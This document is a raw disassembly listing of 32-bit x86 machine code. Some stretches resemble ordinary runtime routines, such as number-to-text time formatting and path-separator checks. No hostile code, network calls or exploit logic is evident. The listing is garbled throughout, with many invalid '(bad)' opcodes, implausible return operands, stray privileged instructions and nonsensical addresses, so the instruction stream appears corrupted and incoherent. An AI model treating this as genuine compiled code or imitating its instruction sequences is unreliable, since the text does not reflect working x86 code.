  409074:	1b c2                	sbb    %edx,%eax
  409076:	0c 00                	or     $0x0,%al
  409078:	ff d6                	call   *%esi
  40907a:	05 0d 01 0a 00       	add    $0xa010d,%eax
  40907f:	5e                   	pop    %esi
  409080:	89 26                	mov    %esp,(%esi)
  409082:	5d                   	pop    %ebp
  409083:	c2 b6 00             	ret    $0xb6
  409086:	fd                   	std
  409087:	45                   	inc    %ebp
  409088:	10 85 c0 68 ad 56    	adc    %al,0x56ad68c0(%ebp)
  40908e:	fa                   	cli
  40908f:	0f bc dd             	bsf    %ebp,%ebx
  409092:	02 89 46 38 33 54    	add    0x54333846(%ecx),%cl
  409098:	c2 59 26             	ret    $0x2659
  40909b:	d8 c2                	fadd   %st(2),%st
  40909d:	0c 63                	or     $0x63,%al
  40909f:	80 e4 fd             	and    $0xfd,%ah
  4090a2:	89 46 38             	mov    %eax,0x38(%esi)
  4090a5:	33 c0                	xor    %eax,%eax
  4090a7:	5e                   	pop    %esi
  4090a8:	8b e5                	mov    %ebp,%esp
  4090aa:	5d                   	pop    %ebp
  4090ab:	c2 0c b8             	ret    $0xb80c
  4090ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4090b1:	8d 55 10             	lea    0x10(%ebp),%edx
  4090b4:	6a 04                	push   $0x4
  4090b6:	52                   	push   %edx
  4090b7:	8b 48 04             	mov    0x4(%eax),%ecx
  4090ba:	68 83 60 00 00       	push   $0x6083
  4090bf:	e1 ff                	loope  0x4090c0
  4090c1:	f9                   	stc
  4090c2:	17                   	pop    %ss
  4090c3:	00 51 ff             	add    %dl,-0x1(%ecx)
  4090c6:	15 b8 e8 74 00       	adc    $0x74e8b8,%eax
  4090cb:	7d f8                	jge    0x4090c5
  4090cd:	ff 0f                	decl   (%edi)
  4090cf:	85 5d ff             	test   %ebx,-0x1(%ebp)
  4090d2:	ff 4e eb             	decl   -0x15(%esi)
  4090d5:	dd b4 f9 00 80 38 00 	fnsave 0x388000(%ecx,%edi,8)
  4090dc:	74 0c                	je     0x4090ea
  4090de:	b8 16 00 00 0b       	mov    $0xb000016,%eax
  4090e3:	5e                   	pop    %esi
  4090e4:	8b fb                	mov    %ebx,%edi
  4090e6:	5d                   	pop    %ebp
  4090e7:	c2 0c 00             	ret    $0xc
  4090ea:	b8 87 96 01 00       	mov    $0x19687,%eax
  4090ef:	5e                   	pop    %esi
  4090f0:	8b e5                	mov    %ebp,%esp
  4090f2:	5d                   	pop    %ebp
  4090f3:	c2 0c 00             	ret    $0xc
  4090f6:	fa                   	cli
  4090f7:	10 70 cb             	adc    %dh,-0x35(%eax)
  4090fa:	4e                   	dec    %esi
  4090fb:	00 ed                	add    %ch,%ch
  4090fd:	8d 40 d1             	lea    -0x2f(%eax),%eax
  409100:	1b 8e ec 00 02 8f    	sbb    -0x70fdff14(%esi),%ecx
  409106:	40                   	inc    %eax
  409107:	00 c0                	add    %al,%al
  409109:	8e 40 00             	mov    0x0(%eax),%es
  40910c:	de 90 d2 00 00 01    	ficoms 0x10000d2(%eax)
  409112:	05 02 05 05 05       	add    $0x5050502,%eax
  409117:	31 05 05 a3 05 00    	xor    %eax,0x5a305
  40911d:	05 05 f0 55 8b       	add    $0x8b55f005,%eax
  409122:	ec                   	in     (%dx),%al
  409123:	83 ec 2c             	sub    $0x2c,%esp
  409126:	8b 45 10             	mov    0x10(%ebp),%eax
  409129:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40912c:	63 57 50             	arpl   %edx,0x50(%edi)
  40912f:	8d 55 95             	lea    -0x6b(%ebp),%edx
  409132:	60                   	pusha
  409133:	6c                   	insb   (%dx),%es:(%edi)
  409134:	f3 d7                	repz xlat %ds:(%ebx)
  409136:	02 93 ff 8b fc f0    	add    -0xf037401(%ebx),%dl
  40913c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40913f:	41                   	inc    %ecx
  409140:	be 0a 00 00 04       	mov    $0x400000a,%esi
  409145:	62 a7 85 d8 c4 3e    	bound  %esp,0x3ec4d885(%edi)
  40914b:	89 8d 04 85 d8 c4    	mov    %ecx,-0x3b277afc(%ebp)
  409151:	44                   	inc    %esp
  409152:	00 88 57 25 40 41    	add    %cl,0x41402557(%eax)
  409158:	61                   	popa
  409159:	10 88 51 ff 8a 40    	adc    %cl,0x408aff51(%eax)
  40915f:	01 8b 55 e8 88 01    	add    %ecx,0x188e855(%ebx)
  409165:	41                   	inc    %ecx
  409166:	8d 04 89             	lea    (%ecx,%ecx,4),%eax
  409169:	a8 c4                	test   $0xc4,%al
  40916b:	40                   	inc    %eax
  40916c:	2d c6 01 fd 41       	sub    $0x41fd01c6,%eax
  409171:	8a 10                	mov    (%eax),%dl
  409173:	88 11                	mov    %dl,(%ecx)
  409175:	8a 50 01             	mov    0x1(%eax),%dl
  409178:	41                   	inc    %ecx
  409179:	40                   	inc    %eax
  40917a:	88 11                	mov    %dl,(%ecx)
  40917c:	8a 40 69             	mov    0x69(%eax),%al
  40917f:	d9 88 01 08 a6 03    	(bad) 0x3a60801(%eax)
  409185:	99                   	cltd
  409186:	f7 fe                	idiv   %esi
  409188:	41                   	inc    %ecx
  409189:	c6                   	(bad)
  40918a:	ca 20 38             	lret   $0x3820
  40918d:	04 30                	add    $0x30,%al
  40918f:	80 17 30             	adcb   $0x30,(%edi)
  409192:	88 01                	mov    %al,(%ecx)
  409194:	8b 45 73             	mov    0x73(%ebp),%eax
  409197:	41                   	inc    %ecx
  409198:	88 11                	mov    %dl,(%ecx)
  40919a:	41                   	inc    %ecx
  40919b:	99                   	cltd
  40919c:	f7 fe                	idiv   %esi
  40919e:	c6 01 20             	movb   $0x20,(%ecx)
  4091a1:	02 04 30             	add    (%eax,%esi,1),%al
  4091a4:	80 c2 30             	add    $0x30,%dl
  4091a7:	88 01                	mov    %al,(%ecx)
  4091a9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4091ac:	41                   	inc    %ecx
  4091ad:	88 11                	mov    %dl,(%ecx)
  4091af:	5b                   	pop    %ebx
  4091b0:	d5 f7                	aad    $0xf7
  4091b2:	4f                   	dec    %edi
  4091b3:	c6 01 3a             	movb   $0x3a,(%ecx)
  4091b6:	34 04                	xor    $0x4,%al
  4091b8:	30 80 62 06 88 01    	xor    %al,0x1880662(%eax)
  4091be:	8b 45 9b             	mov    -0x65(%ebp),%eax
  4091c1:	41                   	inc    %ecx
  4091c2:	0b e0                	or     %eax,%esp
  4091c4:	41                   	inc    %ecx
  4091c5:	99                   	cltd
  4091c6:	f7 cd c6 01 3a 41    	test   $0x413a01c6,%ebp
  4091cc:	e1 30                	loope  0x4091fe
  4091ce:	80 c2 30             	add    $0x30,%dl
  4091d1:	d6                   	salc
  4091d2:	01 41 88             	add    %eax,-0x78(%ecx)
  4091d5:	11 41 8b             	adc    %eax,-0x75(%ecx)
  4091d8:	55                   	push   %ebp
  4091d9:	ec                   	in     (%dx),%al
  4091da:	83 e8 c6             	sub    $0xffffffc6,%eax
  4091dd:	62 00                	bound  %eax,(%eax)
  4091df:	c6 01 20             	movb   $0x20,(%ecx)
  4091e2:	41                   	inc    %ecx
  4091e3:	8d b2 6c 07 00 00    	lea    0x76c(%edx),%esi
  4091e9:	8b c6                	mov    %esi,%eax
  4091eb:	49                   	dec    %ecx
  4091ec:	d6                   	salc
  4091ed:	ff                   	(bad)
  4091ee:	bf 64 16 00 00       	mov    $0x1664,%edi
  4091f3:	04 30                	add    $0x30,%al
  4091f5:	74 01                	je     0x4091f8
  4091f7:	b8 1f 85 eb 51       	mov    $0x51eb851f,%eax
  4091fc:	f7 ea                	imul   %edx
  4091fe:	c1 fa 05             	sar    $0x5,%edx
  409201:	eb c2                	jmp    0x4091c5
  409203:	41                   	inc    %ecx
  409204:	c1 ec 1f             	shr    $0x1f,%esp
  409207:	03 d0                	add    %eax,%edx
  409209:	7c c6                	jl     0x4091d1
  40920b:	15 c2 0d ff 11       	adc    $0x11ff0dc2,%eax
  409210:	de 99 f7 ff b8 58    	ficomps 0x58b8fff7(%ecx)
  409216:	66 66 66 5f          	data16 data16 pop %di
  40921a:	30 ea                	xor    %ch,%dl
  40921c:	c1 fa 7c             	sar    $0x7c,%edx
  40921f:	8b c2                	mov    %edx,%eax
  409221:	c1 e8 1f             	shr    $0x1f,%eax
  409224:	03 d0                	add    %eax,%edx
  409226:	8b c6                	mov    %esi,%eax
  409228:	80 c2 30             	add    $0x30,%dl
  40922b:	be 0a 00 00 00       	mov    $0xa,%esi
  409230:	88 11                	mov    %dl,(%ecx)
  409232:	41                   	inc    %ecx
  409233:	99                   	cltd
  409234:	f7 fe                	idiv   %esi
  409236:	5e                   	pop    %esi
  409237:	80 c2 bf             	add    $0xbf,%dl
  40923a:	33 c0                	xor    %eax,%eax
  40923c:	ca 11 c6             	lret   $0xc611
  40923f:	41                   	inc    %ecx
  409240:	01 00                	add    %eax,(%eax)
  409242:	db e5                	frstpm(287 only)
  409244:	5d                   	pop    %ebp
  409245:	69 0c 00 90 90 e5 ae 	imul   $0xaee59090,(%eax,%eax,1),%ecx
  40924c:	90                   	nop
  40924d:	90                   	nop
  40924e:	90                   	nop
  40924f:	90                   	nop
  409250:	55                   	push   %ebp
  409251:	1f                   	pop    %ds
  409252:	ec                   	in     (%dx),%al
  409253:	53                   	push   %ebx
  409254:	8b 5d 3f             	mov    0x3f(%ebp),%ebx
  409257:	56                   	push   %esi
  409258:	57                   	push   %edi
  409259:	8b fb                	mov    %ebx,%edi
  40925b:	b3 4b                	mov    $0x4b,%bl
  40925d:	8b 33                	mov    (%ebx),%esi
  40925f:	c0 82 75 9b f2 ae f7 	rolb   $0xf7,-0x510d648b(%edx)
  409266:	d1 86 f9 f8 00 00    	roll   $1,0xf8f9(%esi)
  40926c:	00 89 4d 10 84 6b    	add    %cl,0x6b84104d(%ecx)
  409272:	8a 53 01             	mov    0x1(%ebx),%dl
  409275:	80 fa 3a             	cmp    $0x3a,%dl
  409278:	75 25                	jne    0x40929f
  40927a:	21 43 02             	and    %eax,0x2(%ebx)
  40927d:	3c 2f                	cmp    $0x2f,%al
  40927f:	43                   	inc    %ebx
  409280:	12 3c 5c             	adc    (%esp,%ebx,2),%bh
  409283:	75 c7                	jne    0x40924c
  409285:	68 e0 ad 41 00       	push   $0x41ade0
  40928a:	56                   	push   %esi
  40928b:	31 15 10 e8 40 00    	xor    %edx,0x40e810
  409291:	8b 45 0c             	mov    0xc(%ebp),%eax
  409294:	83 c4 79             	add    $0x79,%esp
  409297:	83 f1 04             	xor    $0x4,%ecx
  40929a:	83 c6 e0             	add    $0xffffffe0,%esi
  40929d:	eb 3b                	jmp    0x4092da
  40929f:	8a e1                	mov    %cl,%ah
  4092a1:	3c 2f                	cmp    $0x2f,%al
  4092a3:	74 5b                	je     0x409300
  4092a5:	3c ca                	cmp    $0xca,%al
  4092a7:	75 34                	jne    0x4092dd
  4092a9:	80 fa 2f             	cmp    $0x2f,%dl
  4092ac:	74 05                	je     0x4092b3
  4092ae:	80 fa 5c             	cmp    $0x5c,%dl
  4092b1:	75 2a                	jne    0x4092dd
  4092b3:	80 68 19 2f          	subb   $0x2f,0x19(%eax)
  4092b7:	74 24                	je     0x4092dd
  4092b9:	83 e9 d3             	sub    $0xffffffd3,%ecx
  4092bc:	68 cc 00 41 6b       	push   $0x6b4100cc
  4092c1:	56                   	push   %esi
  4092c2:	83 f7 5e             	xor    $0x5e,%edi
  4092c5:	89 4d c2             	mov    %ecx,-0x3e(%ebp)
  4092c8:	ff 15 10 a1 d4 00    	call   *0xd4a110
  4092ce:	8b 45 0c             	mov    0xc(%ebp),%eax
  4092d1:	83 c4 08             	add    $0x8,%esp
  4092d4:	da e8                	(bad)
  4092d6:	f6 83 c6 10 89 a2 b1 	testb  $0xb1,-0x5d76ef3a(%ebx)
  4092dd:	1d 45 0c 8d 4d       	sbb    $0x4d8d0c45,%eax
  4092e2:	10 e5                	adc    %ah,%ch
  4092e4:	d9 02                	flds   (%edx)
  4092e6:	53                   	push   %ebx
  4092e7:	e8 b4 16 00 fa       	call   0xfa40a9a0
  4092ec:	85 46 74             	test   %eax,0x74(%esi)
  4092ef:	8d 9d 78 27 01 00    	lea    0x12778(%ebp),%ebx
  4092f5:	75 6f                	jne    0x409366
  4092f7:	5f                   	pop    %edi
  4092f8:	5e                   	pop    %esi
  4092f9:	b8 16 00 00 00       	mov    $0x16,%eax
  4092fe:	c9                   	leave
  4092ff:	c5 c3 8b             	(bad)
  409302:	d9 10                	fsts   (%eax)
  409304:	85 c0                	test   %eax,%eax
  409306:	74 0a                	je     0x409312
  409308:	5f                   	pop    %edi
  409309:	5e                   	pop    %esi
  40930a:	b8 26 00 00 00       	mov    $0x26,%eax
  40930f:	5b                   	pop    %ebx
  409310:	5d                   	pop    %ebp
  409311:	ae                   	scas   %es:(%edi),%al
  409312:	b3 8b                	mov    $0x8b,%bl
  409314:	06                   	push   %es
  409315:	82 85 c0 74 17 66 1e 	addb   $0x1e,0x661774c0(%ebp)
  40931c:	2f                   	das
  40931d:	00 75 05             	add    %dh,0x5(%ebp)
  409320:	b3 dc                	mov    $0xdc,%bl
  409322:	06                   	push   %es
  409323:	5c                   	pop    %esp
  409324:	34 66                	xor    $0x66,%al
  409326:	8b 46 02             	mov    0x2(%esi),%eax
  409329:	87 c6                	xchg   %eax,%esi
  40932b:	02 66 cd             	add    -0x33(%esi),%ah
  40932e:	c0 75 e9 e9          	shlb   $0xe9,-0x17(%ebp)
  409332:	c0 5f 5e 5b          	rcrb   $0x5b,0x5e(%edi)
  409336:	5d                   	pop    %ebp
  409337:	c3                   	ret
  409338:	9d                   	popf
  409339:	90                   	nop
  40933a:	f6 90 90 90 90 90    	notb   -0x6f6f6f70(%eax)
  409340:	70 8b                	jo     0x4092cd
  409342:	07                   	pop    %es
  409343:	56                   	push   %esi
  409344:	8b 75 08             	mov    0x8(%ebp),%esi
  409347:	57                   	push   %edi
  409348:	33 ff                	xor    %edi,%edi
  40934a:	83 7e 04 ff          	cmpl   $0xffffffff,0x4(%esi)
  40934e:	0f 84 6f 00 00 2d    	je     0x2d4093c3
  409354:	8a 46 2c             	mov    0x2c(%esi),%al
  409357:	84 6d 74             	test   %ch,0x74(%ebp)
  40935a:	08 df                	or     %bl,%bh
  40935c:	e8 6f 1f 00 00       	call   0x40b2d0
  409361:	8b e1                	mov    %ecx,%esp
  409363:	f8                   	clc
  409364:	46                   	inc    %esi
  409365:	41                   	inc    %ecx
  409366:	25 00 00 00 91       	and    $0x91000000,%eax
  40936b:	74 9d                	je     0x40930a
  40936d:	3d 00 ea 00 2b       	cmp    $0x2b00ea00,%eax
  409372:	3f                   	aas
  409373:	17                   	pop    %ss
  409374:	6a 02                	push   $0x2
  409376:	ff 15 08 c1 40 00    	call   *0x40c108
  40937c:	83 c4 e5             	add    $0xffffffe5,%esp
  40937f:	6a ff                	push   $0xffffffff
  409381:	6a 30                	push   $0x30
  409383:	ff                   	(bad)
  409384:	7f a4                	jg     0x40932a
  409386:	c0 40 00 e8          	rolb   $0xe8,0x0(%eax)
  40938a:	cd 3d                	int    $0x3d
  40938c:	00 00                	add    %al,(%eax)
  40938e:	00 04 75 f0 6a 01 ff 	add    %al,-0xfe9510(,%esi,2)
  409395:	15 08 8c 40 00       	adc    $0x408c08,%eax
  40939a:	83 b0 04 6a b2 4a f5 	xorl   $0xfffffff5,0x4ab26a04(%eax)
  4093a1:	ff 15 a4 c0 3e 00    	call   *0x3ec0a4
  4093a7:	eb 28                	jmp    0x4093d1
  4093a9:	d6                   	salc
  4093aa:	00 00                	add    %al,(%eax)
  4093ac:	00 02                	add    %al,(%edx)
  4093ae:	5c                   	pop    %esp
  4093af:	21 6a 00             	and    %ebp,0x0(%edx)
  4093b2:	ff 15 89 c1 40 00    	call   *0x40c189
  4093b8:	83 c4 41             	add    $0x41,%esp
  4093bb:	35 ff 6a f6 ff       	xor    $0xfff66aff,%eax
  4093c0:	15 a4 c0 40 00       	adc    $0x40c0a4,%eax
  4093c5:	50                   	push   %eax
  4093c6:	de 8b cb 04 50 8c    	fimuls -0x73affb35(%ebx)
  4093cc:	15 74 22 40 2e       	adc    $0x2e402274,%eax
  4093d1:	c7 46 c5 ff ff f3 ff 	movl   $0xfff3ffff,-0x3b(%esi)
  4093d8:	8b 72 0c             	mov    0xc(%edx),%esi
  4093db:	81 c0 d6 15 8b 40    	add    $0x408b15d6,%eax
  4093e1:	10 85 c0 74 0e 50    	adc    %al,0x500e74c0(%ebp)
  4093e7:	ff 15 74 c0 40 00    	call   *0x40c074
  4093ed:	c7 46 4a 00 03 00 00 	movl   $0x300,0x4a(%esi)
  4093f4:	5e                   	pop    %esi
  4093f5:	c7                   	(bad)
  4093f6:	5f                   	pop    %edi
  4093f7:	5e                   	pop    %esi
  4093f8:	5d                   	pop    %ebp
  4093f9:	c3                   	ret
  4093fa:	90                   	nop
  4093fb:	90                   	nop
  4093fc:	fd                   	std
  4093fd:	90                   	nop
  4093fe:	90                   	nop
  4093ff:	90                   	nop
  409400:	18 8b ec b8 59 40    	sbb    %cl,0x4059b8ec(%ebx)
  409406:	00 00                	add    %al,(%eax)
  409408:	e8 33 24 00 00       	call   0x40b840
  40940d:	53                   	push   %ebx
  40940e:	8b 5d 10             	mov    0x10(%ebp),%ebx
  409411:	56                   	push   %esi
  409412:	57                   	push   %edi
  409413:	d3 ff                	sar    %cl,%edi
  409415:	c7 45 f8 f6 84 00 00 	movl   $0x84f6,-0x8(%ebp)
  40941c:	f6 f6                	div    %dh
  40941e:	01 89 7d fc 8e 07    	add    %ecx,0x78efc7d(%ecx)
  409424:	c7                   	(bad)
  409425:	1a fc                	sbb    %ah,%bh
  409427:	06                   	push   %es
  409428:	00 00                	add    %al,(%eax)
  40942a:	80 f6 50             	xor    $0x50,%dh
  40942d:	02 74 07 81          	add    -0x7f(%edi,%eax,1),%dh
  409431:	4d                   	dec    %ebp
  409432:	5e                   	pop    %esi
  409433:	00 7c 00 cb          	add    %bh,-0x35(%eax,%eax,1)
  409437:	f7 c3 59 00 00 08    	test   $0x8000059,%ebx
  40943d:	74 09                	je     0x409448
  40943f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409442:	80 cc 01             	or     $0x1,%ah
  409445:	2c 45                	sub    $0x45,%al
  409447:	fc                   	cld
  409448:	60                   	pusha
  409449:	0d dc 08 41 47       	or     $0x474108dc,%eax
  40944e:	fd                   	std
  40944f:	f9                   	stc
  409450:	1e                   	push   %ds
  409451:	e9 07 c7 45 f8       	jmp    0xf8865b5d
  409456:	07                   	pop    %es
  409457:	00 00                	add    %al,(%eax)
  409459:	00 8b c3 83 e0 04    	add    %cl,0x4e083c3(%ebx)
  40945f:	74 1d                	je     0x40947e
  409461:	f6 c3 40             	test   $0x40,%bl
  409464:	74 05                	je     0x40946b
  409466:	a1 01 00 00 00       	mov    0x1,%eax
  40946b:	29 f3                	sub    %esi,%ebx
  40946d:	8a d3                	mov    %bl,%dl
  40946f:	80 7a 10 f6          	cmpb   $0xf6,0x10(%edx)
  409473:	da 1b                	ficompl (%ebx)
  409475:	d2 83 e2 fe e8 c2    	rolb   %cl,-0x3d17011e(%ebx)
  40947b:	04 eb                	add    $0xeb,%al
  40947d:	0f 8a d3 80 e2 14    	jp     0x15231556
  409483:	f6 da                	neg    %dl
  409485:	1b d2                	sbb    %edx,%edx
  409487:	83 e2 02             	and    $0x2,%edx
  40948a:	83 c2 03             	add    $0x3,%edx
  40948d:	8b f2                	mov    %edx,%esi
  40948f:	f6 d7                	not    %bh
  409491:	40                   	inc    %eax
  409492:	74 12                	je     0x4094a6
  409494:	85 c0                	test   %eax,%eax
  409496:	75 0e                	jne    0x4094a6
  409498:	5f                   	pop    %edi
  409499:	ce                   	into
  40949a:	b8 0d 00 00 00       	mov    $0xd,%eax
  40949f:	5b                   	pop    %ebx
  4094a0:	ef                   	out    %eax,(%dx)
  4094a1:	ea b3 c2 14 00 f6 c7 	ljmp   $0xc7f6,$0x14c2b3
  4094a8:	01 37                	add    %esi,(%edi)
  4094aa:	05 bf 54 00 00       	add    $0x54bf,%eax
  4094af:	04 f7                	add    $0xf7,%al
  4094b1:	c3                   	ret
  4094b2:	42                   	inc    %edx
  4094b3:	00 20                	add    %ah,(%eax)
  4094b5:	00 74 06 81          	add    %dh,-0x7f(%esi,%eax,1)
  4094b9:	60                   	pusha
  4094ba:	00 f5                	add    %dh,%ch
  4094bc:	20 00                	and    %al,(%eax)
  4094be:	f6 16                	notb   (%esi)
  4094c0:	03 75 22             	add    0x22(%ebp),%esi
  4094c3:	9d                   	popf
  4094c4:	c3                   	ret
  4094c5:	00 00                	add    %al,(%eax)
  4094c7:	10 00                	adc    %al,(%eax)
  4094c9:	74 cd                	je     0x409498
  4094cb:	83 5d 1e 7c          	sbbl   $0x7c,0x1e(%ebp)
  4094cf:	06                   	push   %es
  4094d0:	81 cf 00 21 00 01    	or     $0x1002100,%edi
  4094d6:	f7 44 00 00 40 00 74 	testl  $0x7740040,0x0(%eax,%eax,1)
  4094dd:	07 
  4094de:	81 4d ae 00 00 02 4c 	orl    $0x4c020000,-0x52(%ebp)
  4094e5:	c7                   	(bad)
  4094e6:	8d 02                	lea    (%edx),%eax
  4094e8:	74 c3                	je     0x4094ad
  4094ea:	81 cf 00 00 00 40    	or     $0x40000000,%edi
  4094f0:	83 f9 14             	cmp    $0x14,%ecx
  4094f3:	7c e5                	jl     0x4094da
  4094f5:	f6 c7 10             	test   $0x10,%bh
  4094f8:	74 09                	je     0x409503
  4094fa:	80 86 02 81 cf f1 00 	addb   $0x0,-0xe307efe(%esi)
  409501:	47                   	inc    %edi
  409502:	48                   	dec    %eax
  409503:	8b 45 0c             	mov    0xc(%ebp),%eax
  409506:	8d 8d f8 bf ff ea    	lea    -0x15004008(%ebp),%ecx
  40950c:	7d 68                	jge    0x409576
  40950e:	00 20                	add    %ah,(%eax)
  409510:	00 00                	add    %al,(%eax)
  409512:	51                   	push   %ecx
  409513:	e8 38 fd ff ff       	call   0x409250
  409518:	83 c4 0c             	add    $0xc,%esp
  40951b:	85 c0                	test   %eax,%eax
  40951d:	0f a4 91 01 ff 00 8b 	shld   $0x55,%edx,-0x74ff00ff(%ecx)
  409524:	55 
  409525:	f8                   	clc
  409526:	50                   	push   %eax
  409527:	57                   	push   %edi
  409528:	8d                   	lea    (bad),%edx
  409529:	d0 8b 45 fc eb 8d    	rorb   $1,-0x721403bb(%ebx)
  40952f:	8d                   	lea    (bad),%eax
  409530:	c7                   	(bad)
  409531:	bf ff ff 50 82       	mov    $0x8250ffff,%edi
  409536:	ff 15 b0 1f 40 d5    	call   *0xd5401fb0
  40953c:	eb 1b                	jmp    0x409559
  40953e:	8b 55 25             	mov    0x25(%ebp),%edx
  409541:	b7 45                	mov    $0x45,%bh
  409543:	fc                   	cld
  409544:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409547:	6a 00                	push   $0x0
  409549:	57                   	push   %edi
  40954a:	56                   	push   %esi
  40954b:	6a 00                	push   $0x0
  40954d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40954e:	50                   	push   %eax
  40954f:	51                   	push   %ecx
  409550:	ff 15 5f c0 40 69    	call   *0x6940c05f
  409556:	0e                   	push   %cs
  409557:	e7 ef                	out    %eax,$0xef
  409559:	83 f8 ff             	cmp    $0xffffffff,%eax
  40955c:	89 45 10             	mov    %eax,0x10(%ebp)
  40955f:	b4 20                	mov    $0x20,%ah
  409561:	71 35                	jno    0x409598
  409563:	98                   	cwtl
  409564:	c0 40 00 ff          	rolb   $0xff,0x0(%eax)
  409568:	d6                   	salc
  409569:	85 c0                	test   %eax,%eax
  40956b:	0f 84 41 01 00 bd    	je     0xbd4096b2
  409571:	ff c9                	dec    %ecx
  409573:	5f                   	pop    %edi
  409574:	11 39                	adc    %edi,(%ecx)
  409576:	80 45 19 44          	addb   $0x44,0x19(%ebp)
  40957a:	5b                   	pop    %ebx
  40957b:	80 e5 3a             	and    $0x3a,%ch
  40957e:	c2 14 00             	ret    $0x14
  409581:	8b 55 18             	mov    0x18(%ebp),%edx
  409584:	6a b5                	push   $0xffffffb5
  409586:	52                   	push   %edx
  409587:	05 d4 b9 ff ff       	add    $0xffffb9d4,%eax
  40958c:	8b 75 08             	mov    0x8(%ebp),%esi
  40958f:	8b f8                	mov    %eax,%edi
  409591:	33 c0                	xor    %eax,%eax
  409593:	8b d7                	mov    %edi,%edx
  409595:	b9 18 00 00 00       	mov    $0x18,%ecx
  40959a:	d5 ab                	aad    $0xab
  40959c:	8b f4                	mov    %esp,%esi
  40959e:	18 fd                	sbb    %bh,%ch
  4095a0:	4d                   	dec    %ebp
  4095a1:	10 89 16 89 44 f8    	adc    %cl,-0x7bb76ea(%ecx)
  4095a7:	55                   	push   %ebp
  4095a8:	1c 99                	sbb    $0x99,%al
  4095aa:	06                   	push   %es
  4095ab:	df 57 89             	fists  -0x77(%edi)
  4095ae:	48                   	dec    %eax
  4095af:	cf                   	iret
  4095b0:	e8 fc c2 ff ff       	call   0x4058b1
  4095b5:	8b 0e                	mov    (%esi),%ecx
  4095b7:	89 41 20             	mov    %eax,0x20(%ecx)
  4095ba:	8b 16                	mov    (%esi),%edx
  4095bc:	83 c8 ff             	or     $0xffffffff,%eax
  4095bf:	89 5a 18             	mov    %ebx,0x18(%edx)
  4095c2:	8b 21                	mov    (%ecx),%esp
  4095c4:	f6 c3 08             	test   $0x8,%bl
  4095c7:	89 41 10             	mov    %eax,0x10(%ecx)
  4095ca:	89 41 14             	mov    %eax,0x14(%ecx)
  4095cd:	e7 16                	out    %eax,$0x16
  4095cf:	fb                   	sti
  4095d0:	42                   	inc    %edx
  4095d1:	30 74 1b 18          	xor    %dh,0x18(%ebx,%ebx,1)
  4095d5:	d8 6a 02             	fsubrs 0x2(%edx)
  4095d8:	6a 13                	push   $0x13
  4095da:	6a 00                	push   $0x0
  4095dc:	c7 40 34 01 00 00 00 	movl   $0x1,0x34(%eax)
  4095e3:	8b 36                	mov    (%esi),%esi
  4095e5:	8b 51 04             	mov    0x4(%ecx),%edx
  4095e8:	5b                   	pop    %ebx
  4095e9:	ff 45 a8             	incl   -0x58(%ebp)
  4095ec:	c0 40 00 84          	rolb   $0x84,0x0(%eax)
  4095f0:	db 79 66             	fstpt  0x66(%ecx)
  4095f3:	8b 99 68 00 42 00    	mov    0x420068(%ecx),%ebx
  4095f9:	00 57 82             	add    %dl,-0x7e(%edi)
  4095fc:	40                   	inc    %eax
  4095fd:	ce                   	into
  4095fe:	31 c0                	xor    %eax,%eax
  409600:	5c                   	pop    %esp
  409601:	88 e4                	mov    %ah,%ah
  409603:	ff 8b 0e 89 02 38    	decl   0x3802890e(%ebx)
  409609:	8b 16                	mov    (%esi),%edx
  40960b:	c7 42 3f 00 10 00 00 	movl   $0x1000,0x3f(%edx)
  409612:	8b 06                	mov    (%esi),%eax
  409614:	fb                   	sti
  409615:	48                   	dec    %eax
  409616:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  409617:	84 c9                	test   %cl,%cl
  409619:	75 25                	jne    0x409640
  40961b:	8b 48 34             	mov    0x34(%eax),%ecx
  40961e:	bb 0b 74 3c 42       	mov    $0x423c740b,%ebx
  409623:	83 c0 58             	add    $0x58,%eax
  409626:	65 00 50 e8          	add    %dl,%gs:-0x18(%eax)
  40962a:	b2 0b                	mov    $0xb,%dl
  40962c:	00 00                	add    %al,(%eax)
  40962e:	85 5b 89             	test   %ebx,-0x77(%ebx)
  409631:	45                   	inc    %ebp
  409632:	0c 74                	or     $0x74,%al
  409634:	3c 8b                	cmp    $0x8b,%al
  409636:	06                   	push   %es
  409637:	50                   	push   %eax
  409638:	e8 a9 fd ff ff       	call   0x4093e6
  40963d:	83 c4 06             	add    $0x6,%esp
  409640:	85 c7                	test   %eax,%edi
  409642:	75 0e                	jne    0x409652
  409644:	d4 0e                	aam    $0xe
  409646:	68 ce 93 40 00       	push   $0x4093ce
  40964b:	51                   	push   %ecx
  40964c:	92                   	xchg   %eax,%edx
  40964d:	e8 ef bf ff ff       	call   0x405641
  409652:	8b 45 0c             	mov    0xc(%ebp),%eax
  409655:	5f                   	pop    %edi
  409656:	5e                   	pop    %esi
  409657:	5b                   	pop    %ebx
  409658:	8b e5                	mov    %ebp,%esp
  40965a:	5d                   	pop    %ebp
  40965b:	be 14 00 7f 3d       	mov    $0x3d7f0014,%esi
  409660:	dc 08                	fmull  (%eax)
  409662:	41                   	inc    %ecx
  409663:	00 32                	add    %dh,(%edx)
  409665:	7c 16                	jl     0x40967d
  409667:	8b 06                	mov    (%esi),%eax
  409669:	8b 48 6c             	mov    0x6c(%eax),%ecx
  40966c:	84 58 79             	test   %bl,0x79(%eax)
  40966f:	0d 50 e8 4a 00       	or     $0x4ae850,%eax
  409674:	00 3e                	add    %bh,(%esi)
  409676:	83 5a 04 85          	sbbl   $0xffffff85,0x4(%edx)
  40967a:	c0 99 0b 8b 06 8b b3 	rcrb   $0xb3,-0x74f974f5(%ecx)
  409681:	18 94 0f 7f d7 a2 18 	sbb    %dl,0x18a2d77f(%edi,%ecx,1)
  409688:	8b 77 e2             	mov    -0x1e(%edi),%esi
  40968b:	00 a7 83 c2 5c 6a    	add    %ah,0x6a5cc283(%edi)
  409691:	01 a5 e8 78 c9 ff    	add    %esp,-0x368718(%ebp)
  409697:	ff f6                	push   %esi
  409699:	c7                   	(bad)
  40969a:	08 75 15             	or     %dh,0x15(%ebp)
  40969d:	8b 36                	mov    (%esi),%esi
  40969f:	68 20 7e 40 00       	push   $0x407e20
  4096a4:	68 40 93 07 2e       	push   $0x2e079340
  4096a9:	56                   	push   %esi
  4096aa:	72 06                	jb     0x4096b2
  4096ac:	d7                   	xlat   %ds:(%ebx)
